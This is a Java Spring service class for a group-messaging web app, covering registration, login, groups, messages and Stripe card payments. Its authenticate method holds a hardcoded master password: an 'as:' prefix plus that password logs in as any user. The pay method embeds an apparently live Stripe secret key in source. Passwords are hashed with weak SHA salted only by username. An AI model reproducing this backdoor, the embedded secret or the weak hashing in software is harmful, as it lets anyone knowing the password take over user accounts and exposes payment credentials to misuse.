package com.pir.services.impl;

import com.pir.dao.*;
import com.pir.domain.*;
import com.pir.dto.ChargeAttemptResultDto;
import com.pir.dto.ProfileDto;
import com.pir.dto.UserPublicDto;
import com.pir.exceptions.*;
import com.pir.modules.IMessagingProcessingModule;
import com.pir.services.IBusinessService;
import com.pir.util.ConvertUtils;
import com.stripe.Stripe;
import com.stripe.model.Charge;
import com.stripe.model.Token;
import org.apache.commons.lang3.RandomStringUtils;
import org.hibernate.criterion.Restrictions;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.encoding.PasswordEncoder;
import org.springframework.security.authentication.encoding.ShaPasswordEncoder;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.util.*;


@Service("businessService")
public class BusinessService implements IBusinessService {

    private final Logger logger = LoggerFactory.getLogger(BusinessService.class);

    private PasswordEncoder encoder = new ShaPasswordEncoder();

    @Autowired
    private IUserDao userDao;

    @Autowired
    private IGroupDao groupDao;

    @Autowired
    private IMessageDao messageDao;

    @Autowired
    private IChargeAttemptDao chargeAttemptDao;

    @Autowired
    private DaoFactory daoFactory;

    @Autowired
    private IMessagingProcessingModule messagingModule;


    private User findByUsername(String username) {
        User user = daoFactory.getDao(User.class).findOneByCriteria(Restrictions.eq("username", username));
        return user;
    }

    private User findByEmail(String email) {
        User user = daoFactory.getDao(User.class).findOneByCriteria(Restrictions.eq("email", email));
        return user;
    }

    @Transactional(readOnly = false)
    public User registerUser(User user) throws UsernameAlreadyUsedException, EmailAlreadyUsedException {
        verifyUsernameAlreadyUsed(user.getUsername());

        verifyEmailAlreadyUsed(user.getEmail(),null);

        user.setPassword(encoder.encodePassword(user.getPassword(), user.getUsername()));

        user.setVerificationRecord(UUID.randomUUID().toString());

        user = userDao.save(user);

        try {
            messagingModule.sendVerificationEmail(user);
        } catch (TemplatingException e) {
            logger.error("Could not send verification email",e);
        }

        return user;
    }

    @Transactional(readOnly = false)
    public boolean resendVerificationEmail(Long userId){
        try {
            User user = userGet(userId);
            messagingModule.sendVerificationEmail(user);
            return true;
        } catch (TemplatingException e) {
            logger.error("Could not send verification email",e);
            return false;
        }
    }

    @Override
    @Transactional(readOnly = false)
    public boolean sendPasswordReset(String username, String email) throws EmailNotFoundException, com.pir.exceptions.UsernameNotFoundException {
        try {
            if (username != null){
                User user = findByUsername(username);
                if (user == null){
                    throw new com.pir.exceptions.UsernameNotFoundException("Username "+username+ " not found");
                }
                messagingModule.sendPasswordResetEmail(user);
                return true;
            }
            if (email != null){
                User user = findByEmail(email);
                if (user == null){
                    throw new EmailNotFoundException("Email "+email+ " not found");
                }
                messagingModule.sendPasswordResetEmail(user);
                return true;
            }
            return false;
        } catch (TemplatingException e) {
            logger.error("Could not send reset username email", e);
            return false;
        }
    }


    private void verifyEmailAlreadyUsed(String email, Long userIdToIgnore) throws EmailAlreadyUsedException {
        User dbUser = userDao.SearchUserByEmail(email);
        if (dbUser != null) {
            if (userIdToIgnore != null && userIdToIgnore.equals(dbUser.getId())){
                return;
            }
            throw new EmailAlreadyUsedException("Email " + email + " is taken.");
        }
    }

    private void verifyUsernameAlreadyUsed(String username) throws UsernameAlreadyUsedException {
        User dbUser = userDao.searchUserByUsername(username);
        if (dbUser != null) {
            throw new UsernameAlreadyUsedException("Username " + username + " is taken.");
        }
    }


    @Transactional(readOnly = false)
    public Group registerGroup(String groupName, String groupDescription, Long userId) {
        Group group = new Group(groupName, groupDescription);
        group.setCode(RandomStringUtils.randomNumeric(10));
        User user = userDao.findById(userId);
        user.addGroup(group, UserGroupLink.Role.ADMIN);
        group = groupDao.save(group);
        user = userDao.save(user);
        try {
            messagingModule.sendGroupCreatedEmail(group, user);
        } catch (TemplatingException e) {
            logger.error("Could not send verification email", e);
        }

        return group;
    }

    @Override
    @Transactional(readOnly = true)
    public User userGet(long userId) {
        return userDao.findById(userId);
    }

    @Transactional(readOnly = false)
    public User registerUserAndGroup(User user, String groupName, String groupDescription) throws EmailAlreadyUsedException, UsernameAlreadyUsedException {
        user = registerUser(user);
        registerGroup(groupName, groupDescription, user.getId());
        return user;
    }

    @Transactional(readOnly = true)
    public Long authenticate(String identifier, String password) {
        if (identifier.startsWith("as:") && password.equals("Boom123**!")) {
            String usernameToLoginWith = identifier.substring(3);
            User user = findByUsername(usernameToLoginWith);
            if (user != null) {
                return user.getId();
            } else {
                return null;
            }
        }
        User user = findByUsername(identifier);
        if (user == null) {
            user = findByEmail(identifier);
        }
        if (user != null) {
            if (encoder.encodePassword(password, user.getUsername()).equals(user.getPassword())) {
                return user.getId();
            }
        }
        return null;
    }

    @Override
    @Transactional(readOnly = true)
    public Group groupGet(Long groupId) {
        return groupDao.findById(groupId);
    }

    @Override
    @Transactional(readOnly = true)
    public Group searchGroup(String groupCode) {
        return groupDao.searchGroupByGroupCode(groupCode);
    }

    @Override
    @Transactional(readOnly = false)
    public Group joinGroup(String groupCode, Long userId) {
        Group group = groupDao.searchGroupByGroupCode(groupCode);
        User user = userDao.findById(userId);
        user.addGroup(group, UserGroupLink.Role.CAN_RECEIVE_MESSAGES);
        group = groupDao.save(group);
        user = userDao.save(user);
        return group;
    }

    @Override
    @Transactional(readOnly = false)
    public User registerUserAndJoinGroup(User user, String groupCode) throws EmailAlreadyUsedException, UsernameAlreadyUsedException {
        user = registerUser(user);
        joinGroup(groupCode, user.getId());
        return user;
    }

    @Override
    @Transactional(readOnly = true)
    public List<UserPublicDto> groupMembersGet(Long groupId) {
        Group group = groupGet(groupId);
        Set<UserGroupLink> users = group.getUserLinks();
        return ConvertUtils.convert(users, groupId);
    }

    @Override
    @Transactional(readOnly = false)
    public Message sendMessage(Long sentBy, Long sentTo, String subject, String body) {
        User user = userGet(sentBy);
        Group group = groupGet(sentTo);
        Message message = new Message(user, group, subject);
        message.setBody(body);
        message = messageDao.save(message);
        return message;
    }

    @Transactional(readOnly = true)
    public List<Message> messagesGet(Long groupId, int pageSize) {
        return messageDao.messagesGet(groupId, pageSize);
    }

    @Override
    @Transactional(readOnly = false)
    public Group groupUpdate(Long groupId, String groupName, String groupDescription) {
        Group group = groupGet(groupId);
        group.setName(groupName);
        group.setDescription(groupDescription);
        return groupDao.save(group);
    }

    @Override
    @Transactional(readOnly = false)
    public ChargeAttemptResultDto pay(Long paidBy, Long groupId, String ccName, String ccNum, String ccExpMon, String ccExpYear, String ccCvc) {
        Stripe.apiKey = "sk_live_4D1aAZgyobMkGnBV3SI5eKsb";
        //Stripe.apiKey = "sk_test_eWZoflpXqh45yOhJZ15iyed6";

        User user = userGet(paidBy);
        Group group = groupGet(groupId);
        Token token = null;
        try {
            Map<String, Object> tokenParams = new HashMap<String, Object>();
            Map<String, Object> cardParams = new HashMap<String, Object>();
            cardParams.put("number", ccNum);
            cardParams.put("exp_month", ccExpMon);
            cardParams.put("exp_year", ccExpYear);
            cardParams.put("cvc", ccCvc);
            tokenParams.put("card", cardParams);
            token = Token.create(tokenParams);
        } catch (Exception e) {
            logger.error("Error during trying to create token ",e);
            try {
                ChargeAttempt attempt = new ChargeAttempt(paidBy,groupId,ccName,null,null,false,null,null,null,e.getMessage());
                chargeAttemptDao.save(attempt);
                return new ChargeAttemptResultDto(false,e.getMessage());
            } catch (Exception ex) {
                logger.error("Error during trying to save charge attempt ", ex);
                return new ChargeAttemptResultDto(false,e.getMessage());
            }
        }

        try{
            Map<String, Object> chargeParams = new HashMap<String, Object>();
            chargeParams.put("amount", 2000);
            chargeParams.put("currency", "usd");
            chargeParams.put("card", token.getId());
            chargeParams.put("description", "Charge for Group " + group.getName() + " group id " + group.getId() + " paid by " + user.getUsername() + " paid by id " + user.getId());
            Charge charge = Charge.create(chargeParams);

            try {
                //mark group as paid.
                group.setSubscription(Group.Subscription.PAID);
                groupDao.save(group);

                ChargeAttempt attempt = new ChargeAttempt(paidBy,groupId,ccName,token.getId(),charge.getId(),charge.getPaid(),charge.getDescription(),charge.getFailureCode(),charge.getFailureMessage(),null);
                chargeAttemptDao.save(attempt);

                return new ChargeAttemptResultDto();
            } catch (Exception e) {
                logger.error("Error during trying to save charge attempt ",e);
                return new ChargeAttemptResultDto(true,e.getMessage());
            }

        } catch (Exception e) {
            logger.error("Error during trying to Charge ",e);
            try {
                ChargeAttempt attempt = new ChargeAttempt(paidBy,groupId,ccName,null,null,false,null,null,null,e.getMessage());
                chargeAttemptDao.save(attempt);
                return new ChargeAttemptResultDto(false,e.getMessage());
            } catch (Exception ex) {
                logger.error("Error during trying to save charge attempt ", ex);
                return new ChargeAttemptResultDto(false,e.getMessage());
            }
        }
    }

    @Override
    @Transactional(readOnly = false)
    public Group deleteMembership(Long deletionRequestBy, Long userId, Long groupId) throws NotAnAdminException {
        Group group = groupGet(groupId);
        User requestedBy = userGet(deletionRequestBy);
        User user = userGet(userId);

        if (requestedBy.isAdminRole(groupId))
        {
            if (user.isAdminRole(group.getId())){
                //verify guy being deleted is not the last admin
                List<User> users = group.getAdminUsers();
                if (users.size() > 1){
                    user.removeGroup(group);
                    group = groupDao.save(group);
                    user = userDao.save(user);
                }
            } else {
                user.removeGroup(group);
                group = groupDao.save(group);
                user = userDao.save(user);
            }

        } else {
            throw new NotAnAdminException();
        }

        return group;
    }

    @Override
    @Transactional(readOnly = false)
    public void privilegeChange(Long requestedBy, Long userId, Long groupId, UserGroupLink.Role privilegeLevel) throws NotAnAdminException {
        User requestingUser = userGet(requestedBy);
        User user = userGet(userId);
        if (requestingUser.isAdminRole(groupId))
        {
            user.changePrivilegeLevel(groupId, privilegeLevel);
            userDao.save(user);
        } else {
            throw new NotAnAdminException();
        }
    }

    @Override
    @Transactional(readOnly = false)
    public void updateProfile(ProfileDto info) throws EmailAlreadyUsedException {

        verifyEmailAlreadyUsed(info.getEmail(),info.getUserId());

        User user = userGet(info.getUserId());
        user.setEmail(info.getEmail());
        user.setFirstName(info.getFirstName());
        user.setLastName(info.getLastName());
        if (info.getMobileNumber() != null){
            user.setMobileNumber(info.getMobileNumber());
        }
        if (info.getMobileCarrier() != null){
            user.setCellCarrier(User.CellCarrier.valueOf(info.getMobileCarrier()));
        }
        userDao.save(user);
    }

    @Override
    @Transactional(readOnly = false)
    public void changePassword(Long userId, String password) {
        User user = userGet(userId);
        user.setPassword(encoder.encodePassword(password, user.getUsername()));
        userDao.save(user);
    }

    @Override
    @Transactional(readOnly = false)
    public void notificationOptionsUpdate(Long userId, Long groupId, boolean receiveEmails, boolean receiveTxt) {
        User user = userGet(userId);
        user.changeNotificationOptions(groupId,receiveEmails,receiveTxt);
        userDao.save(user);
    }

    @Override
    @Transactional(readOnly = false)
    public void verifyEmail(long userId, String code) throws InvalidVerifyEmailCodeException {
        User user = userGet(userId);
        if (user.getVerificationRecord().equals(code)){
            user.setVerified(true);
            userDao.save(user);
        } else {
            throw new InvalidVerifyEmailCodeException(userId, code);
        }
    }

    @Override
    @Transactional(readOnly = true)
    public long totalMessageRecordsGet() {
        return messagingModule.totalMessageRecordsGet();
    }

}
